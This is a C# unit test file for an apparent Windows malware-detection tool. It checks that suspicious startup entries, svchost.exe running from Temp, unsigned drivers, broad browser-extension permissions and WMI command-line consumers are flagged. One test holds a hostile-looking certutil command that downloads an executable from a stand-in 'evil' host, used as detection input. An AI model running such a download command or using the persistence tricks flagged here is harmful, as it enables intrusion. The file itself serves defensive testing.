using ScanSysDefence.Core.Models;

namespace ScanSysDefence.Tests;

public class ModelTests
{
    [Fact]
    public void StartupItem_AppInitDlls_IsSuspiciousLocation()
    {
        var item = new StartupItem { LocationType = StartupLocationType.AppInitDlls };
        Assert.True(item.IsSuspiciousLocation);
    }

    [Fact]
    public void StartupItem_RegistryRun_IsNotSuspiciousLocation()
    {
        var item = new StartupItem { LocationType = StartupLocationType.RegistryRun };
        Assert.False(item.IsSuspiciousLocation);
    }

    [Fact]
    public void ProcessInfo_MasqueradingSvchostFromTemp_Detected()
    {
        var process = new ProcessInfo
        {
            ProcessName = "svchost.exe",
            Path = @"C:\Users\user\AppData\Local\Temp\svchost.exe"
        };

        Assert.True(process.IsMasquerading);
        Assert.True(process.IsSuspiciousPath);
        Assert.True(process.IsRunningFromTemp);
    }

    [Fact]
    public void ProcessInfo_LegitimateSvchost_NotMasquerading()
    {
        var process = new ProcessInfo
        {
            ProcessName = "svchost.exe",
            Path = @"C:\Windows\System32\svchost.exe"
        };

        Assert.False(process.IsMasquerading);
        Assert.False(process.IsRunningFromTemp);
    }

    [Fact]
    public void ProcessInfo_SuspiciousCommandLine_Detected()
    {
        var process = new ProcessInfo
        {
            ProcessName = "cmd.exe",
            CommandLine = "cmd.exe /c certutil -urlcache -f http://evil/x.exe"
        };

        Assert.True(process.IsSuspiciousCommandLine);
    }

    [Fact]
    public void ScanResult_CountsReflectItemRiskLevels()
    {
        var result = new ScanResult
        {
            Services =
            {
                new ServiceInfo { RiskAssessment = new RiskAssessment { Level = RiskLevel.Critical, TotalScore = 90 } },
                new ServiceInfo { RiskAssessment = new RiskAssessment { Level = RiskLevel.High, TotalScore = 70 } },
                new ServiceInfo { RiskAssessment = new RiskAssessment { Level = RiskLevel.Low, TotalScore = 15 } }
            }
        };

        Assert.Equal(3, result.TotalItems);
        Assert.Equal(2, result.SuspiciousCount); // Medium и выше
        Assert.Equal(1, result.CriticalCount);
        Assert.Equal(1, result.HighCount);
    }

    [Fact]
    public void ScanItemBase_MetadataAndSelection_DefaultsValid()
    {
        var item = new ServiceInfo();
        Assert.NotNull(item.Metadata);
        Assert.NotNull(item.RiskAssessment);
        Assert.NotEqual(string.Empty, item.Id);
    }

    [Fact]
    public void BrowserExtensionInfo_UnstoredWithPath_IsSuspicious()
    {
        var ext = new BrowserExtensionInfo
        {
            ExtensionName = "Test",
            InstallPath = @"C:\fake\path",
            IsFromStore = false
        };

        Assert.True(ext.IsSuspicious);
    }

    [Fact]
    public void BrowserExtensionInfo_AllUrlsPermissions_IsSuspicious()
    {
        var ext = new BrowserExtensionInfo
        {
            ExtensionName = "Test",
            Permissions = "tabs, <all_urls>",
            IsFromStore = true
        };

        Assert.True(ext.IsSuspicious);
    }

    [Fact]
    public void WmiSubscriptionInfo_CommandLineConsumer_IsSuspicious()
    {
        var sub = new WmiSubscriptionInfo
        {
            ConsumerType = "CommandLineEventConsumer",
            ConsumerCommand = "cmd.exe /c calc.exe"
        };

        Assert.True(sub.IsSuspicious);
    }

    [Fact]
    public void DriverInfo_UnsignedDriver_IsSuspicious()
    {
        var driver = new DriverInfo
        {
            DriverName = "rootkit",
            BinaryPath = @"C:\Users\Public\driver.sys",
            IsSigned = false
        };

        Assert.True(driver.IsSuspicious);
    }
}
